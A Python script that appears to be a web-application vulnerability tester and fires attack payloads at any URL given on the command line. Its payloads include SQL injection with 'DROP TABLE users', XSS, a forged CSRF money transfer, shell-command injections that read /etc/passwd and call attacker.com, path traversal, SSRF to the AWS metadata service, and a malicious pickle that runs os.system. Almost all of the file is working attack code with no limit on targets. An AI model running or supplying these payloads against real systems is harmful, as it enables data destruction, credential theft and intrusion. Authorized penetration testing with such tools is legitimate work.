import requests
import pickle
import os
import argparse
from termcolor import colored

# Function to print colored result
def print_result(message, success):
    if success:
        print(colored(message, 'green'))
    else:
        print(colored(message, 'red'))

# 1. SQL Injection Test
def test_sql_injection(base_url):
    url = f'{base_url}/login'
    
    # List of SQL injection payloads
    payloads = [
        "admin' OR 1=1 --", 
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT null, null, version(); --"
    ]

    for payload in payloads:
        response = requests.post(url, data={"username": payload, "password": "password"})
        
        if "Welcome" in response.text or "Error in your SQL syntax" in response.text:
            print_result(f"SQL Injection Successful with payload: {payload}", True)
            return
    
    print_result("SQL Injection Failed", False)


# 2. Cross-Site Scripting (XSS) Test
def test_xss(base_url):
    url = f'{base_url}/comment'
    
    # List of XSS payloads
    payloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '"><img src=x onerror=alert("XSS")>',
    ]

    for payload in payloads:
        response = requests.post(url, data={"comment": payload})
        
        # Check if the payload appears in the response and potentially executes
        if payload in response.text:
            print_result(f"XSS Successful with payload: {payload}", True)
            return
    
    print_result("XSS Failed", False)


# 3. CSRF Test
def test_csrf(base_url):
    url = f'{base_url}/transfer'
    
    # Mimic a CSRF attack by omitting or manipulating CSRF token
    cookies = {'session': 'user_session_cookie'}
    payload = {"to": "attacker_account", "amount": "1000"}
    
    response = requests.post(url, cookies=cookies, data=payload)
    
    # Look for successful actions without proper CSRF protection
    if "Transfer successful" in response.text:
        print_result("CSRF Successful", True)
    else:
        print_result("CSRF Failed", False)


# 4. Remote Code Execution (RCE) Test
def test_rce(base_url):
    url = f'{base_url}/vulnerable_form'
    
    # List of RCE payloads
    payloads = [
        "; whoami",
        "; uname -a",
        "; cat /etc/passwd",
        "; curl http://attacker.com"  # Blind injection
    ]
    
    for payload in payloads:
        response = requests.post(url, data={"input": payload})
        
        if any(keyword in response.text for keyword in ["root", "admin", "user", "bin", "etc"]):
            print_result(f"RCE Successful with payload: {payload}", True)
            return
    
    print_result("RCE Failed", False)


# 5. Directory Traversal Test
def test_directory_traversal(base_url):
    url = f'{base_url}/file'
    
    # List of directory traversal payloads
    payloads = [
        "../../../../etc/passwd",
        "../../windows/system32/drivers/etc/hosts",
        "../../../../var/log/syslog"
    ]

    for payload in payloads:
        response = requests.post(url, data={"file": payload})
        
        if "root:x" in response.text or "127.0.0.1" in response.text:
            print_result(f"Directory Traversal Successful with payload: {payload}", True)
            return
    
    print_result("Directory Traversal Failed", False)


# 6. Command Injection Test
def test_command_injection(base_url):
    url = f'{base_url}/execute'

    # Test multiple payloads
    payloads = [
        "test; ls",
        "test && ls",
        "test | ls",
        "test; whoami",
        "test; uname -a"
    ]

    for payload in payloads:
        response = requests.post(url, data={"input": payload})
        
        # Look for typical output from common commands
        if any(keyword in response.text for keyword in ["root", "bin", "etc", "home", "usr", "file.txt"]):
            print_result(f"Command Injection Successful with payload: {payload}", True)
            return
        
    print_result("Command Injection Failed", False)

# 7. SSRF Test
def test_ssrf(base_url):
    url = f'{base_url}/ssrf'
    
    # List of SSRF payloads
    payloads = [
        "http://127.0.0.1:80",  # Localhost access
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata service
        "http://attacker.com"
    ]

    for payload in payloads:
        response = requests.post(url, data={"url": payload})
        
        if "EC2" in response.text or "200 OK" in response.text:
            print_result(f"SSRF Successful with payload: {payload}", True)
            return
    
    print_result("SSRF Failed", False)


# 8. Insecure Deserialization Test
def test_insecure_deserialization(base_url):

    # Create a malicious pickle object
    class Exploit:
        def __reduce__(self):
            return (os.system, ('whoami',))
    
    malicious_obj = pickle.dumps(Exploit())
    url = f'{base_url}/vulnerable'
    
    response = requests.post(url, data={'data': malicious_obj})
    
    # Check for execution output
    if "root" in response.text:
        print_result("Insecure Deserialization Successful", True)
    else:
        print_result("Insecure Deserialization Failed", False)


# Run selected tests based on arguments
def run_all_tests(base_url, run_all, sql, xss, csrf, rce, traversal, injection, ssrf, deserialization):
    if run_all or sql:
        test_sql_injection(base_url)
    if run_all or xss:
        test_xss(base_url)
    if run_all or csrf:
        test_csrf(base_url)
    if run_all or rce:
        test_rce(base_url)
    if run_all or traversal:
        test_directory_traversal(base_url)
    if run_all or injection:
        test_command_injection(base_url)
    if run_all or ssrf:
        test_ssrf(base_url)
    if run_all or deserialization:
        test_insecure_deserialization(base_url)

# Main function with argparse
def main():
    parser = argparse.ArgumentParser(description="Web Application Vulnerability Tester")
    parser.add_argument("url", help="Base URL of the target web application")
    
    # Optional arguments for enabling/disabling specific tests
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("--sql", action="store_true", help="Enable SQL Injection test")
    parser.add_argument("--xss", action="store_true", help="Enable XSS test")
    parser.add_argument("--csrf", action="store_true", help="Enable CSRF test")
    parser.add_argument("--rce", action="store_true", help="Enable Remote Code Execution test")
    parser.add_argument("--traversal", action="store_true", help="Enable Directory Traversal test")
    parser.add_argument("--injection", action="store_true", help="Enable Command Injection test")
    parser.add_argument("--ssrf", action="store_true", help="Enable SSRF test")
    parser.add_argument("--deserialization", action="store_true", help="Enable Insecure Deserialization test")
    
    args = parser.parse_args()
    
    # Run the selected tests (or all if "--all" is specified)
    run_all_tests(
        base_url=args.url, 
        run_all=args.all, 
        sql=args.sql, 
        xss=args.xss, 
        csrf=args.csrf, 
        rce=args.rce, 
        traversal=args.traversal, 
        injection=args.injection, 
        ssrf=args.ssrf, 
        deserialization=args.deserialization
    )

if __name__ == "__main__":
    main()
